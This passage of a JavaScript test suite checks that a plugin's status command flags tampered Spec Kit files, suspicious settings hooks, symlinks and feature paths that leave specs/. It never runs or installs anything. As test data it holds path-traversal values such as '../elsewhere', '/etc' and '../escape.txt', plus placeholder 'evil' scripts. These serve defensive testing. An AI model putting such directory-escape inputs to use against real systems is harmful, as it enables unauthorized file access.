      k.write({ ".claude/settings.json": settingsWith(".specify/scripts/bash/x.sh --run") });
      if (!has(k.findings(), ".claude/settings.json", "specify")) return bad(`.specify path hook: ${showF(k.findings())}`);
      k.write({ ".claude/settings.json": settingsWith("echo hello") });
      if (k.findings().length) return bad(`an unrelated hook was reported: ${showF(k.findings())}`);
      k.write({ ".claude/settings.json": "{not json" });
      return has(k.findings(), "could not check .claude/settings.json") ? ok() : bad(`bad json: ${showF(k.findings())}`);
    },
  },
  {
    id: "findings/a-tracked-feature-json-or-one-leaving-specs-is-reported",
    run: (s) => {
      const k = kitWorld(s);
      k.write({ ...SK_ALL, ".specify/feature.json": JSON.stringify({ feature_directory: "specs/001-x" }) });
      if (k.findings().length) return bad(`an untracked feature.json inside specs/ was reported: ${showF(k.findings())}`);
      gitIn2(s.repo, ["add", "-f", ".specify/feature.json"]);
      if (!has(k.findings(), ".specify/feature.json", "tracked")) return bad(`tracked: ${showF(k.findings())}`);
      gitIn2(s.repo, ["rm", "-q", "--cached", ".specify/feature.json"]);
      for (const out of ["intent/2026-10-28-x", "../elsewhere", "/etc", "specs/../intent/x", "specs"]) {
        k.write({ ".specify/feature.json": JSON.stringify({ feature_directory: out }) });
        if (!has(k.findings(), ".specify/feature.json", "outside")) return bad(`${out}: ${showF(k.findings())}`);
      }
      k.write({ ".specify/feature.json": "{nope" });
      if (!has(k.findings(), "could not check .specify/feature.json")) return bad(`bad json: ${showF(k.findings())}`);
      rmSync(join(s.repo, ".specify/feature.json"));
      const env = k.findings({ SPECIFY_FEATURE_DIRECTORY: "intent/x" });
      const fine = k.findings({ SPECIFY_FEATURE_DIRECTORY: "specs/001-y" });
      return has(env, "SPECIFY_FEATURE_DIRECTORY") && !fine.length ? ok() : bad(`env: ${showF(env)} / ${showF(fine)}`);
    },
  },
  {
    id: "findings/a-path-that-cannot-be-read-is-a-finding-never-an-error",
    run: (s) => {
      const k = kitWorld(s);
      k.write(SK_ALL);
      rmSync(join(s.repo, SK_SCRIPT));
      mkdirSync(join(s.repo, SK_SCRIPT));
      let r = k.run(["status", "--json"]);
      let f = JSON.parse(r.stdout).engines.find((e) => e.id === "spec-kit").specKitFindings;
      if (r.code !== 0 || !has(f, "could not check", SK_SCRIPT)) return bad(`folder: exit ${r.code}: ${showF(f)}`);
      rmSync(join(s.repo, SK_SCRIPT), { recursive: true });
      writeFileSync(join(s.repo, SK_SCRIPT), SK_PINNED[SK_SCRIPT]);
      writeFileSync(join(s.repo, SK_PLAN), Buffer.from([0x2d, 0x2d, 0x2d, 0x0a, 0xff, 0xfe, 0x0a, 0x2d, 0x2d, 0x2d, 0x0a]));
      f = k.findings();
      if (!has(f, "could not check", SK_PLAN)) return bad(`non-UTF-8: ${showF(f)}`);
      writeFileSync(join(s.repo, SK_PLAN), SK_PINNED[SK_PLAN]);
      writeFileSync(join(s.repo, SK_SCRIPT), "x".repeat(2 * 1024 * 1024));
      f = k.findings();
      if (!has(f, "could not check", SK_SCRIPT)) return bad(`over the size cap: ${showF(f)}`);
      rmSync(join(s.repo, SK_SCRIPT));
      symlinkSync(join(s.repo, ".specify/templates/spec-template.md"), join(s.repo, SK_SCRIPT));
      f = k.findings();
      if (!has(f, SK_SCRIPT, "symlink")) return bad(`pinned symlink: ${showF(f)}`);
      rmSync(join(s.repo, SK_SCRIPT));
      writeFileSync(join(s.repo, SK_SCRIPT), SK_PINNED[SK_SCRIPT]);
      if (typeof process.getuid === "function" && process.getuid() !== 0) {
        chmodSync(join(s.repo, SK_SCRIPT), 0o000);
        f = k.findings();
        chmodSync(join(s.repo, SK_SCRIPT), 0o644);
        if (!has(f, "could not check", SK_SCRIPT)) return bad(`unreadable: ${showF(f)}`);
      }
      return ok();
    },
  },
  {
    id: "findings/a-malformed-pinnedFiles-map-is-a-finding",
    run: (s) => {
      const k = kitWorld(s);
      s.useRows([cliRow(), kitRow({ pinnedFiles: { [SK_SCRIPT]: "nothex", "../escape.txt": sha256("x"), "/abs": sha256("x") } })]);
      k.write(SK_ALL);
      const r = k.run(["status", "--json"]);
      const f = JSON.parse(r.stdout).engines.find((e) => e.id === "spec-kit").specKitFindings;
      return r.code === 0 && has(f, SK_SCRIPT, "could not check") && has(f, "../escape.txt", "could not check") && has(f, "/abs") ? ok() : bad(`exit ${r.code}: ${showF(f)}`);
    },
  },
  {
    id: "findings/known-unpinned-paths-in-the-row-are-not-reported",
    run: (s) => {
      const k = kitWorld(s);
      s.useRows([cliRow(), kitRow({ knownUnpinned: [".specify/workflows/workflow-registry.json"] })]);
      k.write({ ...SK_ALL, ".specify/workflows/workflow-registry.json": "{}\n" });
      const f = k.findings();
      if (f.length) return bad(`findings ${showF(f)}`);
      k.write({ ".specify/workflows/other.yml": "x\n" });
      return has(k.findings(), ".specify/workflows/other.yml") ? ok() : bad("an unlisted workflow file was not reported");
    },
  },
  {
    id: "findings/status-prints-them-in-text-form",
    run: (s) => {
      const k = kitWorld(s);
      k.write({ ...SK_ALL, [SK_SCRIPT]: "#!/bin/sh\nevil\n" });
      const r = k.run(["status"]);
      return r.code === 0 && r.out.includes(SK_SCRIPT) ? ok() : bad(`exit ${r.code}: ${r.out}`);
    },
  },
  {
    id: "findings/status-never-runs-specify-or-installs-anything",
    run: (s) => {
      const k = kitWorld(s, { cli: "old" });
      k.write({ ...SK_ALL, [SK_SCRIPT]: "evil\n", ".specify/extensions.yml": "x\n", [SK_PLAN]: skSkill("speckit-plan", ""),
        ".claude/settings.json": settingsWith("specify init"), ".specify/feature.json": JSON.stringify({ feature_directory: "../x" }) });
      for (const args of [["status", "--json"], ["status"], ["--owner", "pro-speckit", "status", "--json"]]) {
        const r = k.run(args);
        if (r.code !== 0) return bad(`${args.join(" ")}: exit ${r.code}: ${r.out}`);
      }
      if (k.ran() || k.specifyCalls().length) return bad(NOTHING);
      const odd = s.calls("uv").filter((c) => c.argv[0] !== "tool" || c.argv[1] !== "dir");
      return odd.length ? bad(`uv was asked to do more than find its folder: ${JSON.stringify(odd)}`) : ok();
    },
  },
);

export function runProDevCases({ pluginRoot = DEFAULT_PLUGIN_ROOT, only = null } = {}) {
  const selected = only ? CASES.filter((c) => c.id.includes(only)) : CASES;
  const out = { skipped: null, selected, results: [] };
  for (const p of ["scripts/pro-dev.py", "scripts/pro-dev-nudge.py", "registry/engines.json"]) {
    if (!existsSync(join(pluginRoot, p))) return { ...out, skipped: `${join(pluginRoot, p)} not found` };
  }
  for (const t of ["python3", "git"]) {
    if (spawnSync(t, ["--version"], { stdio: "ignore" }).error) return { ...out, skipped: `${t} not found on PATH` };
  }
  for (const c of selected) {
    const s = buildSandbox(pluginRoot);
    let result;
    try { result = c.run(s, pluginRoot); }
    catch (err) { result = { ok: false, detail: `threw: ${(err && err.stack) || err}` }; }
    finally { rmSync(s.root, { recursive: true, force: true }); }
    out.results.push({ id: c.id, ok: !!result.ok, detail: result.detail || "" });
  }
  return out;
}

function main() {
  const args = process.argv.slice(2);
  const only = args.find((a) => a.startsWith("--only="))?.slice(7) ?? null;
  const root = args.find((a) => a.startsWith("--plugin-root="))?.slice(14);
  const { skipped, selected, results } = runProDevCases({ only, ...(root ? { pluginRoot: resolve(root) } : {}) });
  if (skipped) { console.log(`skipped: ${skipped}`); return 0; }
  if (!selected.length) { console.log("no cases match"); return 1; }
  let failed = 0;
  for (const r of results) {
    console.log(`${r.ok ? "PASS" : "FAIL"} ${r.id}${r.ok ? "" : `\n     ${r.detail}`}`);
    if (!r.ok) failed++;
  }
  console.log(`\n${failed ? "✗" : "✓"} ${results.length} cases · ${failed} failures`);
  return failed ? 1 : 0;
}

if (process.argv[1] && resolve(process.argv[1]) === fileURLToPath(import.meta.url)) process.exit(main());
